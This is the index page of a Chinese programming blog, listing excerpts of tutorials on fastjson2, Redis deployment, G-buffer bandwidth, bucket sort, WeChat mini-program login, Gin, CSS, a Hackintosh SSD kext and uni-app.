<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4aaa3aee57cdf3c5416a81813864e7c7/" rel="bookmark">
			11-高性能JSON库——fastjson2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.具体使用
1.1.添加fastjson2依赖
1.2.常用类和方法
1.3.将JSON字符串转换成对象
1.3.1.JSON字符串转换成对象
1.3.2.JSON字符串转换成数组
1.4.将对象转换成JSON字符串
1.4.1.将对象转换成JSON字符串
1.4.2.将数组转换成 JSON 字符串
2.性能测试报告
3.总结
fastjson2 是 fastjson 项目的重要升级，目标是为下一个十年提供一个高性能的 JSON 库，同一套 API 支持JSON/JSONB 两种协议，JSONPath 是一等公民，支持全量解析和部分解析，支持 Java 服务端、客户端Android、大数据场景。
1.具体使用 1.1.添加fastjson2依赖 Maven依赖配置如下：
&lt;dependency&gt; &lt;groupId&gt;com.alibaba.fastjson2&lt;/groupId&gt; &lt;artifactId&gt;fastjson2&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt; &lt;/dependency&gt; 1.2.常用类和方法 package com.alibaba.fastjson2; class JSON { // 将字符串解析成JSONObject static JSONObject parseObject(String str); // 将字符串解析成JSONArray static JSONArray parseArray(String str); // 将字符串解析成Java对象 static T parseObject(byte[] utf8Bytes, Class&lt;T&gt; objectClass); // 将Java对象输出成字符串 static String toJSONString(Object object); // 将Java对象输出成UT8编码的byte[] static byte[] toJSONBytes(Object object); } class JSONB { // 将jsonb格式的byte[]解析成Java对象 static T parseObject(byte[] jsonbBytes, Class&lt;T&gt; objectClass); // 将Java对象输出成jsonb格式的byte[] static byte[] toBytes(Object object); } class JSONObject { Object get(String key); int getIntValue(String key); Integer getInteger(String key); long getLongValue(String key); Long getLong(String key); T getObject(String key, Class&lt;T&gt; objectClass); // 将JSONObject对象转换为Java对象 T toJavaObject(Class&lt;T&gt; objectClass); } class JSONArray { Object get(int index); int getIntValue(int index); Integer getInteger(int index); long getLongValue(int index); Long getLong(int index); T getObject(int index, Class&lt;T&gt; objectClass); } class JSONPath { // 构造JSONPath static JSONPath of(String path); // 根据path直接解析输入，会部分解析优化，不会全部解析 Object extract(JSONReader jsonReader); // 根据path对对象求值 Object eval(Object rootObject); } class JSONReader { // 构造基于String输入的JSONReader static JSONReader of(String str); // 构造基于ut8编码byte数组输入的JSONReader static JSONReader of(byte[] utf8Bytes); // 构造基于char[]输入的JSONReader static JSONReader of(char[] chars); // 构造基于json格式byte数组输入的JSONReader static JSONReader ofJSONB(byte[] jsonbBytes) } 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4aaa3aee57cdf3c5416a81813864e7c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c474df12e708b767538ae84a150ea29b/" rel="bookmark">
			图像处理中常用的卷积核
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常用的卷积核 常用的卷积核包括以下几种：
垂直边缘检测卷积核：用于检测图像中的垂直边缘，通常为3x3大小的卷积核，例如：
Copy code
1 0 -1 1 0 -1 1 0 -1 水平边缘检测卷积核：用于检测图像中的水平边缘，通常为3x3大小的卷积核，例如：
Copy code
1 1 1 0 0 0 -1 -1 -1 Sobel卷积核：用于检测图像中的边缘，包括垂直和水平边缘，通常为3x3大小的卷积核，例如：
Copy code
1 0 -1 2 0 -2 1 0 -1 Copy code
1 2 1 0 0 0 -1 -2 -1 高斯卷积核：用于图像模糊处理和图像降噪，通常为奇数大小的卷积核，例如：
Copy code
1 2 1 2 4 2 1 2 1 Laplacian卷积核：用于图像锐化处理，通常为3x3或5x5大小的卷积核，例如：
Copy code
0 1 0 1 -4 1 0 1 0 Copy code
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c474df12e708b767538ae84a150ea29b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c60c05d9423aced7200be7c125f5d852/" rel="bookmark">
			Redis部署简单步骤及主从搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一·单机版部署Redis 1·Redis的介绍 Redis是一个开源的内存数据结构存储系统，它支持多种数据结构，包括字符串、哈希表、列表、集合、有序集合等，可以用于缓存、消息队列、排行榜、计数器、分布式锁等多种场景。Redis的特点是数据读写速度快、支持事务和Lua脚本、支持持久化、支持集群等。Redis的优势在于其高效的内存读写能力，使得它在处理高并发、大量数据的场景下表现出色。
2·Redis的使用场景 Redis是一款高性能的内存数据库，常用于缓存、消息队列、计数器、实时排行榜等场景。以下是一些常见的使用场景：
①. 缓存： Redis的高速读写能力使其成为一个优秀的缓存解决方案，可以将热点数据存储在Redis中，加速应用程序的响应速度。
②. 消息队列： Redis提供了一些用于消息发布和订阅的命令，可以用作轻量级的消息队列，支持多个消费者同时订阅同一个消息。
③. 计数器： Redis提供了自增自减操作，可以用于实现计数器功能，例如网站访问量统计等。
④. 实时排行榜： Redis的有序集合可以用于实现排行榜功能，例如游戏中的积分排行榜、音乐网站的热门歌曲排行榜等。
⑤. 分布式锁： Redis的原子操作和过期时间特性可以用于实现分布式锁，防止多个客户端同时修改同一个资源。
总之，Redis具有高性能、可扩展性和丰富的数据结构等优点，适用于各种高并发、低延迟的应用场景。
3·Redis的单机版部署搭建 1·拉取tar.gz包 首先我们需要在官网上找到自己所对应的版本的包，进行拉取
网址在这里 Index of /releases/ (redis.io)https://download.redis.io/releases/拉取的步骤就不解释了，找到对应的包，右键鼠标，复制链接，在虚拟机里wget进行拉取即可，如下；
mkdir -p /data/application
wget http: //download.rediswgetio/releases/redis-4.0.9.tar.gz 这里是4.0.9的版本
tar zxvf redis-4.0.9.tar.gz-C /data/app
cd /data/app
mv redis.4.0.9 redis
2·初始化redis配置 由于redis是c语言开发的，所以我们需要c的插件，需要我们先安装
yum -y install gcc c++ make 切换我们的redis目录内，执行初始化命令
make
3·备份redis的配置文件 为什么要备份呢，就是因为担心后续修改数据什么的修改错误什么的一些人为出现的错误
cp redis.conf redis.conf.bak
4·修改配置文件 bind 192.168.0.0　#只监听内网IP，改成四个0 ：noh/:nohlsearch可以取消高亮
daemonize yes　#开启后台模式将on改为yes
port 6379 #端口号
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c60c05d9423aced7200be7c125f5d852/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b2883be8cb1cfbf52252ace8ea744b9/" rel="bookmark">
			延迟渲染G-buffer所占显存带宽计算（解决移动端和抗锯齿的若干疑问）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		延迟渲染需要在前面阶段，将计算的内容保留在N张G-buffer中，但是网上的文章只是提及了G-buffer应该压缩，并且尽量少用，没有说明G-buffer所占带宽应该是多少，我将在下面介绍G-buffer所占显存带宽的详细计算方法
G-buffer的存储内容 为了减少G-buffer的内容，现在基本会对G-buffer内容进行压缩
我原来有段时间很喜欢玩《killing floor2》这个游戏，是拿ue3引擎做的，
（《killing floor》的发展史和虚幻引擎发展有着密不可分的关系，一代在当时就有很好的效果）
下面这张图是《killing floor2》的G-buffer存储方法
可以看到除了深度模板视图，总共用了4张RT去存储G-buffer信息
G-buffer所占显存带宽的计算 首先每张RT有RGBA四个通道，每个通道是8bit，那么总共是4*8=32bit的通道信息
如果屏幕是1920*1080p的，一张RT整张屏幕存储的通道信息就为1920*1080*4*8bit
如果游戏流畅运行需要60fps（《杀戮空间2》是射击游戏，需要高刷新率），那么在一秒中一张RT所传递的信息就为
1920*1080*4*8*60bit=3981312000bit/s，大概是0.46GB
那么《杀戮空间2》用了四张G-buffer,单一次单向传输就用了将近2G/s的带宽
它的发售时间为2016年末，那时候平常游戏玩家用的卡的带宽在148.8GB/s
但是需要看游戏的最低要求配置，是GeForce GTS 250，这张显卡的显存频率为
1100MHz，显存位宽为256bit，带宽粗略为35G/s，但是显卡需要这个带宽去处理别的事情，可见显存带宽的宝贵性
关于移动端延迟渲染的障碍 移动端的瓶颈在带宽
带宽是电量消耗和发热的大客户。带宽是一种共享资源，因此使用过多会以不可预知的方式限制整个系统的性能。访问外部存储器需要大量功率，因此减少带宽使用可降低功耗，移动端GPU和CPU是共享内存的，因此 GPU 的高带宽使用会降低 CPU 性能
手机游戏的性能优化，要以极低的配置目标做优化，那我们选择一个几年前的手机去做计算
小米6的内存是LPDDR4X 1866MHZ,32bit 双通道
所以内存带宽是，1866 * 32 / 8 * 2 * 2
算下来大概为30 GB/s 再算上屏幕缓冲区加上深度缓冲区，读写宽带，overdraw，cpu内存读取等开销
总共用30GB/s的带宽，可见移动端的开销是非常紧迫的
这时候上延迟渲染就很难了
不过，在ue5.1中，在关闭静态光的情况下, 使用三张G-buffer支持了桌面端全部的shadingmodel, 并在源码里预留了第四张gbuffer的开关
关于延迟渲染和ssaa与msaa 这个问题的争议比较大，我对这个问题的结论是，可以实现，但是效果可能不正确
延迟渲染和ssaa ssaa是放大屏幕分辨率，最后再缩放，采样多个映射的子像素点进行插值
在前向渲染中，最后结果都在高分辨率的颜色缓冲区中，在高分辨率的颜色缓冲区中采样再进行插值计算，得到最后的结果
再延迟渲染中，在最后的光照计算后，也得到的是高分辨率的颜色缓冲区，也可以进行插值计算，得到最后的结果，但是在计算光照之前，需要多张高分辨率的G-buffer去存储信息，这个开销巨大
延迟渲染和msaa msaa是在ssaa的基础上发展而来的，通过测试的子像素才能复制中心像素的颜色，一个像素只计算一次，最后再写入颜色缓冲区
再延迟渲染中，这个像素周围的信息已经丢失了，无法进行采样了，那么有没有办法解决这个问题呢
当然有办法了
在计算得到每一张G-buffer的时候，执行一遍子像素测试，这时候的每一张G-buffer都是取完插值的结果，这时候就保留了每一个像素的周边情况，最后再和光照做计算就没问题
但是，插值得到保留法线和深度的G-buffer可能插值不正确
所以msaa完全可以用延迟渲染，但是计算结果可能不正确
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f95504d246c8e040d513fb8e592c4b9/" rel="bookmark">
			推荐4个很棒的Java项目，超级适合小白练手，赶紧收藏！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		好程序员今天给大家推荐4个很棒的Java练手项目，超适合小白哦~
网上订餐管理系统 经过对订餐软件的研究、使用，切身体会用户的需求再对商家展开一系列调查，确定商家的需求。基于这些调查结果，设计系统功能。
订餐者必须是在线注册了的用户，创立用户(customer表）数据库单独保存用户信息，建立用户登陆和注册的页面。建立管理员身份以管理店铺内食品信息。创立(control表)数据库单独保存管理员信息，建立管理员登陆页面，管理员管理页面。设立便捷高效的后台管理功能，方便商家管理员对整个系统内的食品进行管理
大学生健康档案管理系统， 目前演示数据中主要包括三种角色:管理员、医生、学生，其中管理员包含最高权限;可对体检表，健康文档，体检数据图标展示等进行管理，以及权限管理，指定不同科室医生进行不同的操作。此项目为前后端分离项目，后端API接口为SpringBoot项目;前端为vue项目。
医生在线挂号系统 用户分为患者，医生，管理员，患者可进行注册选择医生挂号，选择日期，选择号源，医生可进行接诊，管理员可对用户，医生信息的维护等等功能。
环境配置:Jdk1.8+Tomcat8.5+mysql+Eclispe(IntelliJIDEAEclispe,MyEclispe,Sts都支持）
项目技术:Jdbc+Ser/let+Jsp+css+JavaScript+JQuery+Ajax+Fileupload等等。
酒店管理系统 酒店管理系统拥有两个角色，分别为管理员和员工，具体功能如下有房间类型管理、楼层管理、客房管理、员工管理、日志查询、数据查询等使用的项目技术包括后端框架Servlet、mvc模式，前端框架Layui、jsp、css、JavaScriptJQueryo
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9f9ac27212217060f0a74acbd5c5e50/" rel="bookmark">
			01_08_桶排序（Bucket Sort）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		桶排序（Bucket Sort） 桶排序（Bucket Sort）介绍： 是一种排序算法，适用于数据范围较小且分布均匀的浮点数数据。它将待排序序列划分为若干个桶（区间），对每个桶中的元素进行排序，然后按顺序合并所有桶的元素得到最终有序序列。
桶排序（Bucket Sort）原理： 确定桶的数量和范围：根据待排序序列的特点，确定桶的数量和每个桶的范围。桶的数量通常与待排序序列的元素数量相同，范围根据待排序序列的最大值和最小值来确定。将待排序序列中的每个元素分配到对应的桶中：根据元素的大小，将每个元素放入相应的桶中。对每个桶中的元素进行排序：可以使用其他排序算法，如插入排序或快速排序，对每个桶中的元素进行排序。合并所有桶的元素：按照桶的顺序，将每个桶中的元素按顺序合并到一个新的有序序列中。 Java 代码实现： package com.algorithm.sort; /** * 桶排序的实现原理： * &lt;p&gt; * 1.确定桶的数量和范围：根据待排序序列的特点，确定桶的数量和每个桶的范围。桶的数量通常与待排序序列的元素数量相同，范围根据待排序序列的最大值和最小值来确定。 * 2.将待排序序列中的每个元素分配到对应的桶中：根据元素的大小，将每个元素放入相应的桶中。 * 3.对每个桶中的元素进行排序：可以使用其他排序算法，如插入排序或快速排序，对每个桶中的元素进行排序。 * 4.合并所有桶的元素：按照桶的顺序，将每个桶中的元素按顺序合并到一个新的有序序列中。 */ import java.util.ArrayList; import java.util.Collections; public class BucketSort { /** * 桶排序算法实现 * * @param arr 待排序数组 */ public static void bucketSort(float[] arr) { int n = arr.length; // 创建桶 ArrayList&lt;Float&gt;[] buckets = new ArrayList[n]; for (int i = 0; i &lt; n; i++) { buckets[i] = new ArrayList&lt;&gt;(); } // 将元素分配到桶中 for (int i = 0; i &lt; n; i++) { int bucketIndex = (int) (n * arr[i]); buckets[bucketIndex].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9f9ac27212217060f0a74acbd5c5e50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50d56cf01c3215d54acf25ca6818ef34/" rel="bookmark">
			微信小程序获取用户手机号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信小程序通过获取用户手机号实现登录 一、首先页面上引入button标签
//login.wxml &lt;button open-type="getPhoneNumber" type="primary" bindgetphonenumber="onGetPhoneNumber"&gt; &lt;image class="wx-btn" src="../../assets/images/index/wx-btn.png" /&gt; &lt;view&gt;微信一键登录&lt;/view&gt; &lt;/button&gt; 二、获取步骤
1、获取code，一定要提前获取
onLoad(options) { wx.login({ success(res) { if (res.code) { that.setData({ code: res.code }) } else { console.log('登录失败！' + res.errMsg) } } }) }, 2、获取session_key和解密手机号
onGetPhoneNumber(e) { if (e.detail.errMsg.indexOf('ok') != -1) { var that = this; getOpenId(this.data.code).then(rs =&gt; { var session_key = rs.data.session_key; //解密手机号 var msg = e.detail.errMsg; var encryptedData = e.detail.encryptedData; var iv = e.detail.iv; wx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/50d56cf01c3215d54acf25ca6818ef34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2742ca001873ce7b1dbd767ff94cb670/" rel="bookmark">
			从0开始，精通Go语言Rest微服务架构和开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说在前面 现在拿到offer超级难，甚至连面试电话，一个都搞不到。
尼恩的技术社区中（50+），很多小伙伴凭借 “左手云原生+右手大数据”的绝活，拿到了offer，并且是非常优质的offer，据说年终奖都足足18个月。
第二个案例就是：前段时间，一个2年小伙伴希望涨薪到18K， 尼恩把GO 语言的项目架构，给他写入了简历，导致他的简历金光闪闪，脱胎换骨，完全可以去拿头条、腾讯等30K的offer， 年薪可以直接多 20W。
第三个案例就是：一个6年小伙伴凭借Java+go双语言云原生架构，年薪60W。
从Java高薪岗位和就业岗位来看，云原生、K8S、GO 现在对于 高级工程师/架构师来说，越来越重要。
所以，尼恩从架构师视角出发，基于尼恩 3高架构知识宇宙，写一本《GO学习圣经》
《GO学习圣经》已经完成的内容有：
Go学习圣经：0基础精通GO开发与高并发架构 Go学习圣经：队列削峰+批量写入 超高并发原理和实操 《GO学习圣经》PDF的最终目标
咱们的目标，不仅仅在于 GO 应用编程自由，更在于 GO 架构自由。
另外，前面尼恩的云原生是没有涉及GO的，但是，没有GO的云原生是不完整的。
所以， GO语言、GO架构学习完了之后，咱们再去打个回马枪，完成云原生的第二部分: 《Istio + K8S CRD的架构与开发实操》 , 帮助大家彻底穿透云原生。
文章目录 说在前面基于 Gin 框架的 Rest微服务架构与选型回顾：java+go 多语言 云原生微服务架构 Gin 框架 简介Gin 框架的安装和使用使用 Gin 框架编写 Hello Worldmain.go的执行过程 Gin Rest微服务的模块设计Gin Rest微服务目录结构 Gin框架WEB开发入门基本安装Rest请求路由的配置和使用Rest请求路径的设置router.GET方法的源码分析Gin配置路由的七个主要方法路由分组 大规模路由的多文件配置获取参数获取路径参数获取URL参数获取Post方法URL参数和Post参数的获取案例 文件上传表单验证设置校验的规则content-type绑定 Gin 数据返回类型Gin 重定向异步执行会话控制cookie相关session相关token相关 Gin中间件默认Gin中间件自定义Gin中间件中间件控制的方法局部中间件 Gin的路由框架：httprouter框架前缀树和基数树（radix tree）的区别：gin框架路由原理gin注册路由过程： 微服务统一配置管理为什么需要分布式配置中心分布式配置中心技术选型Spring Cloud NacosSpring Cloud Eureka： golang的土著配置组件viper 通过 viper实现统一配置管理功能1、viper的介绍2、viper的安装和使用2.1 Viper对象的创建2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2742ca001873ce7b1dbd767ff94cb670/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cbd99a4dbf93edfc74884640119af00/" rel="bookmark">
			CSS中高度塌陷问题以及解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.什么是高度塌陷 首先在DOM中，父元素div的高度在没有设定高度情况下是默认被子元素撑开，就是说父多高，子就有多高。可是在设定子元素为float：left/right后，子元素会完全脱离文档流，此时将会导致子元素无法撑起父元素的高度，导致父元素的高度塌陷。
这样可能导致子元素对于父元素脱节，上移，导致整个界面布局混乱。一下是我设定的高度塌陷的实例：
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;&lt;/title&gt; &lt;style type="text/css"&gt; .box1{ /*为box1设置一个边框*/ border: 10px red solid; } .box2{ width: 100px; height: 100px; background-color: blue; float: left; } .box3{ height: 100px; background-color: yellow; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="box1"&gt; &lt;div class="box2"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="box3"&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 结果：
二.解决方案 1.推介使用，单伪元素after清除浮动： after+zoom（最好用的，最推荐的，兼容性也很好）
.box1::after{ content: "";/*伪元素内容为空*/ display: block;/*非默认的就行，也可以是table等等*/ height: 0;/*伪元素高度为0，不影响其他元素*/ clear: both;/*清除浮动*/ visibility: hidden;/*不可见*/ } 效果：
2.给父元素设置固定高度（不推荐）
使用该方法后，父元素的高度就不能根据子元素自动撑高了，如果可以固定高度，可以使用这种方式，否则，不推荐这种方式。以下是我的做法
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cbd99a4dbf93edfc74884640119af00/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6030601e04f7d9ed103d10350d03a575/" rel="bookmark">
			黑苹果M.2接口SSD由外置改为内置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有2个，一个是改DSDT，今天是另外一个，其实我搜了很久，都是建议改DSDT的，心累，最后看到了一个装LILU插件的，可是却并没有附件(搬帖不全)，网上搜到的都是要付费下载的
知道插件名字叫 innie.kext，是LILU.KEXT的插件，看到远景，有一个帖子给了附件，但是我没有账号，下载不了，别的都需要付费下载，是真心累啊
果断bing，最后在 GitHub上找到了这个名为 innie的LILU插件
也到找到其最新版本 1.3.1还是个RELEASE版本，这个也适用于白苹果
修复黑苹果NVME固态硬盘显示橙色Innie.kext 1.3.1
Innie.kext 1.3.1 黑苹果补丁
修复nvme固态橙色|橙盘问题.
Innie.kext 1.3.1直接放efi的kext里就行，然后在OCC中添加一下
对于白苹果(这段是摘抄的，没有具体测试，我的白苹果换上nvme就是正常的)
关闭SLP
下载lilu.kext
打开LILU.KEXT包，在contents里建一个plugin，然后把 innie.kext扔进去
把lilu.kext扔进/Library/Extensions.
然后修复S/L/E权限，也就是：
sudo chmod -R 755 /Library/Extensions/Lilu.kext
sudo chown -R root:wheel /Library/Extensions/Lilu.kext
sudo touch /Library/Extensions
sudo kextcache -update-volume /
重启
对于黑苹果 挂载EFI分区，打开CLOVER/OC等的KEXT目录然后把 innie.kext扔进去用OCC或者别的编辑器打开config，在kernel中添加innie.kext，保存。重启 效果 我自己的 爱国者 P2000 256G NVME SSD 成功内置。
据说速度有提升，不过我没有测试。完结撒花
下载地址
GitHub下载不了的各位，我上传蓝奏云了，自取吧
https://wwks.lanzouk.com/b04k3f16f
密码:b4mu
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ea55d8c2876baaad220e37c1705c07a/" rel="bookmark">
			kali linux搭建pwn环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.cnblogs.com/LY613313/p/16180128.html 这个博主说得非常详细，适合大部分新手，搭建环境一步一步做就可以了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a990257831210f449766cf2db2dda8ed/" rel="bookmark">
			Python日期带时区转换工具类总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.背景 最近项目是国际项目，所以需要经常需要用到UTC时间和local时间的转换。 所以整理了一下时间戳工具类，方便使用。 这里主要用到的包就是datatime、time、pytz。
2. 遇到的坑 直接看测试案例
tzinfo=pytz.timezone("Asia/Shanghai") dtStr = "2023-05-28 00:00:00" dt1 = datetime.datetime.strptime(dtStr,"%Y-%m-%d %H:%M:%S").replace(tzinfo=tzinfo) dt2 = dt_tz = tzinfo.localize(datetime.datetime.strptime(dtStr, '%Y-%m-%d %H:%M:%S')) print(dt1) print(dt2) 输出结果：
2023-05-28 00:00:00+08:06 2023-05-28 00:00:00+08:00 这里第一种方法dt1中的输出时区带有06分的差异。
3. 一些小案例 3.1 当前日期、日期时间、UTC日期时间 print(DateUtil.currDate()) print(DateUtil.currDateTime()) print(DateUtil.currDateTime("UTC")) 输出结果：
2023-05-29 2023-05-29 10:44:27 2023-05-29 02:44:27 3.2 昨天、昨天UTC日期、昨天现在这个时间点的时间戳 print(DateUtil.yesterday()) print(DateUtil.yesterdayUTC()) print(DateUtil.yesterday_ts()) 输出结果：
2023-05-28 2023-05-28 #这里如果是早上8点以前运行的就不一样 1685242026391 3.3 日期转时间戳 print(DateUtil.date2ts("2023-05-28")) print(DateUtil.datetime2ts("2023-05-28 10:01:01")) print(DateUtil.datetime2ts("2023-05-28 10:01:01","UTC")) print(DateUtil.datetime2ts("2023-05-28 10:01:01","Asia/Shanghai")) 输出结果：
1685203200000 1685239261000 1685268061000 #如果使用的是UTC格式，则时间戳不一样 1685239261000 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a990257831210f449766cf2db2dda8ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/101c0b7df814ef2f8509a3cc266a9575/" rel="bookmark">
			Uniapp uni-app学习与快速上手
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人开源uni-app开源项目地址：准备中
在线展示项目地址：准备中
什么是uni-app uni，读 you ni，是统一的意思。
Dcloud即数字天堂(北京)网络技术有限公司是W3C成员及HTML5中国产业联盟发起单位，致力于推进HTML5发展构建，HTML5生态。
2012年，DCloud开始研发小程序技术，优化webview的功能和性能，推出了HBuilder可视化开发工具。
2015年，DCloud正式商用了自己的小程序，产品名为“流应用”，它是能接近原生功能、性能的App，并且即点即用，第一次使用时可以做到边下载边使用。
2016年，微信团队上线小程序业务，但其没有接入联盟标准，而是订制了自己的标准。
技术是纯粹的，不应该因为商业利益而分裂。开发者面对如此多的私有标准不是一件正确的事情。
造成混乱的局面非DCloud所愿。于是他们决定开发一个免费开源的框架。
既然各巨头无法在标准上达成一致，那么就通过这个框架为开发者抹平各平台差异。
这，就是uni-app的由来。
uni-app 是一个使用 Vue.js 开发所有前端应用的框架，开发者编写一套代码，可发布到iOS、Android、Web（响应式）、以及各种小程序（微信/支付宝/百度/头条/飞书/QQ/快手/钉钉/淘宝）、快应用等多个平台。
为什么选择uni-app 自 2017-1-9微信小程序诞生以来，小程序的开发生态蓬勃发展，从最初的微信原生开发，到wepy、mpvue、taro、uni-app等框架依次出现，从刀耕火种演进为现代化开发，生态越来越丰富。
选择多了，问题也就来了，开发小程序，该用原生还是选择三方框架？
首先，微信原生开发的槽点大多集中如下：
原生开发对Node、预编译器、webpack支持不好，影响开发效率和工程构建流程微信定义了一个不伦不类的语法，不如正经学vue、react，学会了全端通用，而不是只为小程序。小程序的setData和类似template模式像是React和Vue的混合体，却丢了React的灵活和Vue的响应式。vue/react生态里有太多周边工具，可以提高开发效率，比如ide、校验器、三方库。。。微信那个ide和专业编辑器相比实在不好用没有正儿八经的状态管理 同时，开发者对三方框架，又总是有各种顾虑：
怕性能不如原生怕有些功能框架实现不了，只能用原生怕框架不稳定，跳到坑里以及诸多三方框架，到底该用哪个 而uni-app在开发者数量、案例、跨端抹平度、扩展灵活性、性能体验、周边生态、学习成本、开发成本等8大关键指标上拥有更强的优势。
基于通用的前端技术栈，采用vue语法+微信小程序api，无额外学习成本。插件市场数千款插件。支持NPM、支持小程序组件和SDK。微信生态的各种sdk可直接用于跨平台App。就像web开发中使用vue、react一样，浏览器出了一个新API，并不会涉及vue、react的升级。uniapp不会限制开发者调用底层能力支持微信的所有原生组件和api，无限制。在跨端方面，即便仍然使用微信原生的组件和API，也可以直接跨端编译到App、H5、以及支付宝百度头条等小程序。
但为了管理清晰，推荐使用uni封装的API，类似uni.request()。同时支持条件编译，可在条件编译代码块中，随意调用各个平台新增的API及组件 快速上手： 使用vue-cli脚手架，创建uniapp工程
vue create -p dcloudio/uni-preset-vue my-project
选择hellow uniapp，项目创建完成后目录结构如下：
cli创建的项目，是传统的node项目结构。工程代码在src目录下，编译器在项目下，编译结果在dist目录下。
npm install下载相关依赖，npm run dev:h5运行结果如下
运行、发布uni-app npm run dev:%PLATFORM%
npm run build:%PLATFORM%
%PLATFORM% 可取值如下：
app-plus app平台生成打包资源（支持npm run - build:app-plus，可用于持续集成。不支持run，运行调试仍需在HBuilderX中操作）h5 H5mp-alipay 支付宝小程序mp-baidu 百度小程序mp-weixin 微信小程序mp-toutiao 抖音小程序mp-lark 飞书小程序mp-qq qq 小程序mp-360 360 小程序mp-kuaishou 快手小程序mp-jd 京东小程序mp-xhs 小红书小程序quickapp-webview 快应用(webview)quickapp-webview-union 快应用联盟quickapp-webview-huawei 快应用华为 对比学习 如果你有一定的VUE与原生JS开发基础
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/101c0b7df814ef2f8509a3cc266a9575/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f284ae591c67db23939365475b03b29a/" rel="bookmark">
			CAN转WIFI 智能CAN/WLAN网关案例分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		应用1：近距离无线监视 ：近距离无线监视、维护和诊断
应用2：两个CAN网络之间的无线传输
智能CAN/WLAN网关其它典型应用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ca5cc260f04adecc19b451f21777496/" rel="bookmark">
			【Redis实战】本地连接阿里云部署的Redis
			</a>
